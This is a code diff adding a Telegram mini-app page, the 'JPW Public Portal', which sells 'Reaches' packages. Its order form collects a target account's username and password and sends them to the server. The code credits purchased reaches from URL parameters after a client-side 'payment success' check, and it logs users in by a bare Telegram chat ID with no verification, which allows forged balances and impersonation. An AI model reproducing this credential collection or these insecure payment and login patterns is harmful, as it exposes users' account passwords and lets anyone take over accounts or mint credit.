@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JPW Portal - Public Reach Service</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #0f172a, #1e293b, #090d16); 
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            margin: 0; padding: 20px; color: #fff; min-height: 100vh; 
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .container { 
+            max-width: 500px; margin: 0 auto; background: rgba(30, 41, 59, 0.85); 
+            backdrop-filter: blur(16px); padding: 25px; border-radius: 20px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1); 
+        }
+        .logo-box { text-align: center; margin-bottom: 10px; }
+        .logo-box img { width: 75px; height: 75px; border-radius: 50%; border: 2px solid #3b82f6; box-shadow: 0 0 15px rgba(59,130,246,0.5); }
+        h2 { text-align: center; color: #38bdf8; margin: 10px 0 20px 0; font-size: 26px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+        input, button { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        input { background: rgba(15, 23, 42, 0.6); color: #fff; border: 1px solid rgba(255, 255, 255, 0.15); outline: none; transition: 0.3s; }
+        input:focus { border-color: #38bdf8; box-shadow: 0 0 10px rgba(56,189,248,0.4); }
+        input::placeholder { color: #94a3b8; }
+        button { background: linear-gradient(135deg, #38bdf8, #0284c7); color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(56,189,248,0.3); }
+        button:hover { transform: translateY(-2px); opacity: 0.95; }
+        
+        .pkg-card { 
+            background: rgba(15, 23, 42, 0.4); padding: 15px; margin: 12px 0; border-radius: 12px; 
+            display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(255, 255, 255, 0.08); 
+        }
+        .pkg-card button { width: auto; padding: 8px 18px; margin: 0; font-size: 14px; background: linear-gradient(135deg, #10b981, #059669); color: #fff; }
+        .badge { background: #10b981; color: white; padding: 4px 12px; border-radius: 20px; font-size: 14px; font-weight: bold; }
+        .hidden { display: none; }
+        .task-btn { background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-box">
+        <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="JPW Logo">
+    </div>
+    <h2>JPW Public Portal</h2>
+
+    <div id="web-login-screen" class="hidden">
+        <h3 style="text-align: center; color: #cbd5e1;">Web Login via Telegram ID</h3>
+        <p style="font-size: 13px; color: #94a3b8; text-align: center;">बॉट में `/start` दबाकर अपनी Telegram ID प्राप्त करें और यहाँ दर्ज करें:</p>
+        <input type="text" id="webChatIdInput" placeholder="Enter Telegram Chat ID">
+        <button onclick="requestOtp()">📩 Send OTP</button>
+        <p id="loginMsg" style="color:#f87171; text-align:center; font-weight:bold;"></p>
+    </div>
+
+    <div id="otp-verify-screen" class="hidden">
+        <h3 style="text-align: center; color: #cbd5e1;">Enter Verification OTP</h3>
+        <p style="font-size: 13px; color: #38bdf8; text-align: center;">आपके टेलीग्राम चैट पर 6-अंकों का OTP भेज दिया गया है।</p>
+        <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6">
+        <button onclick="verifyOtp()">🔐 Verify & Login</button>
+        <button onclick="backToChatId()" style="background: rgba(255,255,255,0.08); color: #fff; margin-top: 5px;">⬅️ Back</button>
+        <p id="otpMsg" style="color:#f87171; text-align:center; font-weight:bold;"></p>
+    </div>
+
+    <div id="dashboard-screen" class="hidden">
+        <div style="background:rgba(15, 23, 42, 0.5); padding:18px; border-radius:14px; text-align:center; border: 1px solid rgba(255,255,255,0.08);">
+            <p style="margin: 5px 0;">👤 <b>Name:</b> <span id="userName" style="color: #38bdf8;"></span></p>
+            <p style="margin: 5px 0;">💬 <b>Telegram ID:</b> <span id="dispChatId" style="font-size: 13px; color: #94a3b8;"></span></p>
+            <p style="margin: 5px 0;">💎 <b>Balance:</b> <span id="userBalance" class="badge">0</span> Reaches</p>
+            <button onclick="logout()" style="background: #ef4444; color: #fff; width:auto; padding:6px 16px; margin-top:10px; font-size:14px;">🚪 Logout</button>
+        </div>
+
+        <button class="task-btn" onclick="alert('⏳ Coming Soon! Video Task feature is under development.')">🎬 Watch Video & Earn (Coming Soon)</button>
+
+        <h3 style="margin-top:25px; color: #38bdf8; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 5px;">📦 Buy Recharge Packages</h3>
+        <div id="packages-list"></div>
+
+        <h3 style="margin-top:25px; color: #38bdf8; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 5px;">⚡ Submit New Order</h3>
+        <input type="text" id="targetId" placeholder="Target Username / ID">
+        <input type="password" id="targetPass" placeholder="Target Password">
+        <button onclick="submitOrder()">🚀 Submit Order Now</button>
+        <p id="orderMsg" style="text-align:center; font-weight:bold; margin-top: 10px;"></p>
+    </div>
+</div>
+
+<script>
+    let telegramChatId = localStorage.getItem('jpw_chat_id') || '';
+    let userName = 'User';
+
+    window.addEventListener('DOMContentLoaded', async () => {
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('payment') === 'success') {
+            const chatId = urlParams.get('telegramChatId');
+            const reaches = urlParams.get('reaches');
+            if (chatId && reaches) {
+                try {
+                    await fetch('/api/verify-instant', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ telegramChatId: chatId, reaches })
+                    });
+                    alert(`🎉 Payment Successful! ${reaches} Reaches added.`);
+                } catch(e) {}
+                window.location.href = '/';
+                return;
+            }
+        }
+
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            telegramChatId = String(tg.initDataUnsafe.user.id);
+            userName = tg.initDataUnsafe.user.first_name || 'User';
+            localStorage.setItem('jpw_chat_id', telegramChatId);
+            authenticateMiniApp(telegramChatId, userName);
+        } else if (telegramChatId) {
+            authenticateMiniApp(telegramChatId, 'Web User');
+        } else {
+            document.getElementById('web-login-screen').classList.remove('hidden');
+        }
+    });
+
+    let tempChatId = '';
+
+    async function requestOtp() {
+        tempChatId = document.getElementById('webChatIdInput').value.trim();
+        const msgTag = document.getElementById('loginMsg');
+        if(!tempChatId) {
+            msgTag.innerText = "Please enter your Telegram Chat ID!";
+            return;
+        }
+        msgTag.innerText = "Sending OTP to Telegram...";
+
+        try {
+            const res = await fetch('/api/send-otp', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ telegramChatId: tempChatId })
+            });
+            const data = await res.json();
+            if(data.success) {
+                document.getElementById('web-login-screen').classList.add('hidden');
+                document.getElementById('otp-verify-screen').classList.remove('hidden');
+                document.getElementById('otpMsg').innerText = "";
+            } else {
+                msgTag.innerText = data.message || "Failed to send OTP!";
+            }
+        } catch(e) {
+            msgTag.innerText = "Network Error!";
+        }
+    }
+
+    async function verifyOtp() {
+        const otp = document.getElementById('otpInput').value.trim();
+        const msgTag = document.getElementById('otpMsg');
+        if(!otp || otp.length !== 6) {
+            msgTag.innerText = "Please enter a valid 6-digit OTP!";
+            return;
+        }
+        msgTag.innerText = "Verifying...";
+
+        try {
+            const res = await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ telegramChatId: tempChatId, otp })
+            });
+            const data = await res.json();
+            if(data.success) {
+                telegramChatId = data.user.telegramChatId;
+                userName = data.user.name;
+                localStorage.setItem('jpw_chat_id', telegramChatId);
+                
+                document.getElementById('otp-verify-screen').classList.add('hidden');
+                document.getElementById('dashboard-screen').classList.remove('hidden');
+                document.getElementById('userName').innerText = data.user.name;
+                document.getElementById('dispChatId').innerText = data.user.telegramChatId;
+                document.getElementById('userBalance').innerText = data.user.reaches;
+                loadPackages();
+            } else {
+                msgTag.innerText = data.message || "Incorrect OTP!";
+            }
+        } catch(e) {
+            msgTag.innerText = "Network Error!";
+        }
+    }
+
+    function backToChatId() {
+        document.getElementById('otp-verify-screen').classList.add('hidden');
+        document.getElementById('web-login-screen').classList.remove('hidden');
+    }
+
+    async function authenticateMiniApp(chatId, name) {
+        try {
+            const res = await fetch('/api/mini-app/auth', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ telegramChatId: chatId, name })
+            });
+            const data = await res.json();
+            if(data.success) {
+                document.getElementById('web-login-screen').classList.add('hidden');
+                document.getElementById('otp-verify-screen').classList.add('hidden');
+                document.getElementById('dashboard-screen').classList.remove('hidden');
+                document.getElementById('userName').innerText = data.user.name;
+                document.getElementById('dispChatId').innerText = data.user.telegramChatId;
+                document.getElementById('userBalance').innerText = data.user.reaches;
+                loadPackages();
+            } else {
+                localStorage.removeItem('jpw_chat_id');
+                document.getElementById('web-login-screen').classList.remove('hidden');
+            }
+        } catch(e) {
+            document.getElementById('web-login-screen').classList.remove('hidden');
+        }
+    }
+
+    function logout() {
+        localStorage.removeItem('jpw_chat_id');
+        location.reload();
+    }
+
+    async function loadPackages() {
+        const res = await fetch('/api/packages');
+        const data = await res.json();
+        let html = '';
+        data.packages.forEach(pkg => {
+            html += `<div class="pkg-card">
+                <span>₹${pkg.amount} ➡️ <b>${pkg.reaches} Reaches</b></span>
+                <button onclick="buyPackage(${pkg.amount}, ${pkg.reaches})">💳 Pay</button>
+            </div>`;
+        });
+        document.getElementById('packages-list').innerHTML = html;
+    }
+
+    async function buyPackage(amount, reaches) {
+        const res = await fetch('/api/pay', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ telegramChatId, amount, reaches })
+        });
+        const data = await res.json();
+        if(data.success) {
+            window.location.href = data.paymentUrl;
+        } else {
+            alert('Error: ' + data.message);
+        }
+    }
+
+    async function submitOrder() {
+        const targetId = document.getElementById('targetId').value.trim();
+        const targetPass = document.getElementById('targetPass').value.trim();
+        if(!targetId || !targetPass) return alert('All fields required');
+
+        const res = await fetch('/api/order', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ telegramChatId, targetId, targetPass })
+        });
+        const data = await res.json();
+        const msgTag = document.getElementById('orderMsg');
+        msgTag.innerText = data.message;
+        msgTag.style.color = data.success ? '#10b981' : '#f87171';
+        if(data.success) {
+            document.getElementById('targetId').value = '';
+            document.getElementById('targetPass').value = '';
+            authenticateMiniApp(telegramChatId, userName);
+        }
+    }
+</script>
+
+</body>
+</html>
